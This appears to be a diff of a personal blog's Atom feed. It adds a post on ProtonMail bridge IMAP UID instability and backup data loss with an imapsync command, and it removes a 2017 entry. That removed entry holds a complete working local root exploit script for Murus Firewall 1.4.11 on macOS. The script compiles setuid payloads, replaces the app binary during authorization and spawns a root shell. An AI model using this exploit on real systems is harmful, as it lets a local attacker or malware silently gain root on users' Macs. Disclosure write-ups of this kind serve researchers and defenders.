@@ -6,7 +6,76 @@
   </author>
   <id>https://m4.rkw.io/blog/</id>
   <title>m4.rkw.io</title>
-  <updated>2022-02-28T21:15:24+00:00</updated>
+  <updated>2022-06-05T11:40:53+00:00</updated>
+  <entry>
+    <id>https://m4.rkw.io/blog/psa-your-protonmail-backups-might-not-be-safe</id>
+    <link href="https://m4.rkw.io/blog/psa-your-protonmail-backups-might-not-be-safe"/>
+    <summary><p>I was a fan of the ProtonMail email service until I was casually linked to this
+issue while discussing something else:</p><p><pre>https://github.com/ProtonMail/proton-bridge/issues/220</pre></p><p>TL;DR message UIDs returned by proton-bridge are unstable and subject to change
+*without* UIDVALIDITY changing. This is not only bad because it violates the RFC
+but also because it can lead to data loss in at least a couple of scenarios:</p><p><pre>1) Incremental backups that match on message UID, such as offlineimap, will
+eventually end up with local duplicates of some messages and other messages
+never downloaded because the UIDs can&#x27;t be relied on. Although not technically
+direct loss of data, you might assume your backups are complete and try to
+migrate to another service and only later realise some data was missing.</pre></p><p>2) An IMAP client communicating with the bridge could be asked to delete a
+message. If the UIDs are changing underneath the message that gets deleted could
+be the wrong one. There is at least one report of this happening to someone on
+the github thread.</p><p>The ProtonMail team have apparently decided that completely rewriting the
+backend is the solution to this issue which was reported as far back as
+September last year. I don&#x27;t agree with this strategy but it is what it is,
+however a much more fundamental failing here is that they haven&#x27;t notified any
+users that the bridge is unsafe. I think this is really terrible as many people
+might be relying on IMAP backup tools or clients and not even realise they could
+be losing data.</p><p>Additionally during the course of investigating this problem I discovered
+another problem with the service - orphaned messages. It&#x27;s not entirely clear to
+me all of the ways that this can occur but somehow messages can become orphaned
+from any folder. They exist in your account and appear under the &quot;All Mail&quot;
+folder but aren&#x27;t actually in any of the real folders returned over the IMAP
+interface. I discovered I had 23,793 messages in this state that were
+consequently not being backed up by my backup system as I had wrongly assumed
+that everything would at least be in Archive or another folder by default.</p><p>Apparently this is a longstanding issue that they&#x27;ve neglected to fix for quite
+some time.</p><p>So what to do? I considered just migrating my email to another service and I may
+yet still do that however before taking such drastic action I wanted to try to
+fix the issues at hand and configure sane backups that work properly.</p><p>The first thing to do was to fix the orphaned messages and set up some kind of
+monitor so I&#x27;d know if it happened again. Fixing this was a bit convoluted,
+first I needed a way to *reliably* retrieve all of the messages via the IMAP
+interface exposed by the bridge. Matching on headers seemed to be the sensible
+way to do this and the ProtonMail system convenient uses an X-Pm-Internal-Id
+header for every message which seems to be globally unique. Unfortunately
+offlineimap doesn&#x27;t support matching on headers so I rolled a local dovecot
+instance and switched to imapsync - https://github.com/imapsync/imapsync.</p><p>Using imapsync I was then able to reliably retrieve all of my messages that were
+in folders and also the &quot;All Mail&quot; folder which contained absolutely everything,
+including the orphaned messages. Then I wrote a quick bit of python to scan the
+X-Pm-Internal-Id header for all of the messages in order to determine which ones
+were orphaned. So at this point I had identified 23793 orphaned messages, 15000
+of which were messages that I had actually thought were deleted - more on this
+below.</p><p>Then I had to figure out how best to fix them. My first thought was contact
+ProtonMail support so I did that, but then thought about it some more and I
+wondered what would happen if I were to drop one of the orphaned messages into
+my local Archive folder and then sync it back into ProtonMail via the bridge
+using imapsync. My theory was that it would match the message on the
+X-Pm-Internal-Id header and assign it to the Archive folder without duplicating
+it. This worked and I was then able to do the same for the rest of the messages.</p><p>After this has been completed I ran imapsync with the --justfoldersizes option
+and was able to verify that the message count in the All Mail folder was now
+equal to the sum of messages in the other folders, which means there are now no
+orphans.</p><p>So why did I have 15000 orphaned messages that should have been deleted? Well
+there&#x27;s something funny about the way the IMAP protocol is implemented on the
+bridge, the normal method of deleting a message is to set the \\Deleted flag on
+the message and then EXPUNGE. However with ProtonMail&#x27;s bridge IMAP interface
+this merely removes the message from any folders, it&#x27;s still there in All Mail.
+I thought perhaps moving it to the Trash folder before deleting it might work
+but the result was the same. I&#x27;m waiting on ProtonMail support to provide an
+answer as to how to permanently delete messages via the IMAP interface.</p><p>So beware if you&#x27;re currently backing up your ProtonMail account with tools that
+don&#x27;t match on headers, you might be at risk of losing data.</p><p>This is the full imapsync command I&#x27;m using:</p><p><pre>imapsync --host1 localhost --port1 1143 --user1 user1 --passfile1 ~/.pass1 \
+    --host2 localhost --port2 143 --user2 user2 --passfile2 ~/.pass2 \
+    --useheader X-Pm-Internal-Id --delete2 --folder Archive --folder Drafts \
+    --folder INBOX --folder Sent --folder Spam --folder Trash --include \
+    Folders.* --noemailreport1 --noemailreport2
+</pre></p></summary>
+    <title>PSA: Your ProtonMail backups might not be safe</title>
+    <updated>2022-06-05T12:16:38+00:00</updated>
+    <dc:date>2022-06-05T12:16:38+00:00</dc:date>
+  </entry>
   <entry>
     <id>https://m4.rkw.io/blog/lulu-firewall-hardening</id>
     <link href="https://m4.rkw.io/blog/lulu-firewall-hardening"/>
@@ -1277,69 +1346,5 @@ issue or a hangover from the BSD-inherited cron system, I suspect the latter.</p
     <updated>2017-12-06T07:32:52+00:00</updated>
     <dc:date>2017-12-06T07:32:52+00:00</dc:date>
   </entry>
-  <entry>
-    <id>https://m4.rkw.io/blog/murus-firewall-1411-escalation-hihack--root-privesc</id>
-    <link href="https://m4.rkw.io/blog/murus-firewall-1411-escalation-hihack--root-privesc"/>
-    <summary><p>I recently blogged about the prevalence of escalation hijack vulnerabilities
-amongst macOS applications. One example of this is the latest version of Murus
-firewall. By design it requires the user to authenticate every time in order to
-obtain the access it needs to modify the firewall settings.</p><p>If a local attacker or malware is running as an admin user (ie has write access
-to /Applications/) they can subvert this process to silently obtain root access
-without the user knowing.</p><p><pre>https://m4.rkw.io/murus1.4.11.sh.txt
-9c332c07747e11c78c34f9dc8d30127250d95edd5e58a571ed1a005eafd32301
--------------------------------------------------------------------------------
-#!/bin/bash</pre></p><p><pre>##################################################################
-###### Murus 1.4.11 local root privilege escalation exploit ######
-###### by m4rkw - https://m4.rkw.io/blog.html               ######
-##################################################################</pre></p><p><pre>echo &quot;compiling payloads...&quot;</pre></p><p><pre>cat &gt; /tmp/murus411_exp.c &lt;&lt;EOF
-#include &lt;unistd.h&gt;
-int main()
-{
-  setuid(0);
-  seteuid(0);
-  execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-c&quot;,&quot;rm -f /tmp/murus411_exp; /bin/bash&quot;,NULL);
-  return 0;
-}
-EOF</pre></p><p><pre>gcc -o /tmp/murus411_exp /tmp/murus411_exp.c</pre></p><p><pre>if [ ! $? -eq 0 ] ; then
-  rm -f /tmp/murus411_exp.c
-	echo &quot;failed to compile, dev tools may not be installed&quot;
-  exit 1
-fi</pre></p><p><pre>rm -f /tmp/murus411_exp.c</pre></p><p><pre>cat &gt; /tmp/murus411_exp2.c &lt;&lt;EOF
-#include &lt;unistd.h&gt;
-#include &lt;stdlib.h&gt;
-int main()
-{
-  setuid(0);
-  seteuid(0);
-  system(&quot;chown root:wheel /tmp/murus411_exp&quot;);
-  system(&quot;chmod 4755 /tmp/murus411_exp&quot;);
-  system(&quot;mv /Applications/Murus.app/Contents/MacOS/Murus.orig /Applications/\
-Murus.app/Contents/MacOS/Murus&quot;);
-  execl(&quot;/Applications/Murus.app/Contents/MacOS/Murus&quot;,&quot;Murus&quot;,NULL);
-  return 0;
-}
-EOF</pre></p><p><pre>gcc -o /tmp/murus411_exp2 /tmp/murus411_exp2.c
-rm -f /tmp/murus411_exp2.c</pre></p><p><pre>echo &quot;waiting for loader...&quot;</pre></p><p><pre>while :
-do
-  ps auxwww |grep &#x27;/Applications/Murus.app/Contents/MacOS/MurusLoader&#x27; \
-    |grep -v grep 1&gt;/dev/null
-  if [ $? -eq 0 ] ; then
-    break
-  fi
-done</pre></p><p><pre>echo &quot;planting payload...&quot;</pre></p><p><pre>mv /Applications/Murus.app/Contents/MacOS/Murus /Applications/Murus.app/\
-Contents/MacOS/Murus.orig
-mv /tmp/murus411_exp2 /Applications/Murus.app/Contents/MacOS/Murus</pre></p><p><pre>echo &quot;waiting for payload to trigger...&quot;</pre></p><p><pre>while :
-do
-  r=`ls -la /tmp/murus411_exp |grep root`
-  if [ &quot;$r&quot; != &quot;&quot; ] ; then
-    break
-  fi
-  sleep 0.1
-done</pre></p><p><pre>echo &quot;kapow&quot;</pre></p><p><pre>/tmp/murus411_exp
-</pre></p></summary>
-    <title>Murus Firewall 1.4.11 escalation hihack / root privesc</title>
-    <updated>2017-12-04T12:23:56+00:00</updated>
-    <dc:date>2017-12-04T12:23:56+00:00</dc:date>
-  </entry>
-  <dc:date>2022-02-28T21:15:24+00:00</dc:date>
+  <dc:date>2022-06-05T11:40:53+00:00</dc:date>
 </feed>
